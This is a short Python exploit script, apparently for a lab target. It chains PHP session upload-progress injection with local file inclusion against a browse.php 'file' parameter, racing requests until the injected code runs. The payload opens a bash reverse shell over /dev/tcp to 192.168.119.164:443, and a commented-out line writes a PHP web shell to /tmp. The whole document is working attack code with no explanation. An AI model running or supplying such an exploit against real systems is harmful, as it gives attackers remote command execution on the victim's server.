import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://10.1.1.27/browse.php'
param = "?p=source&file="

# code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
code = '''system("bash -c 'bash -i >& /dev/tcp/192.168.119.164/443 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                          files={'f': "A"*0xffff},
                          data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                          cookies={'PHPSESSID': sess_name}),
           grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
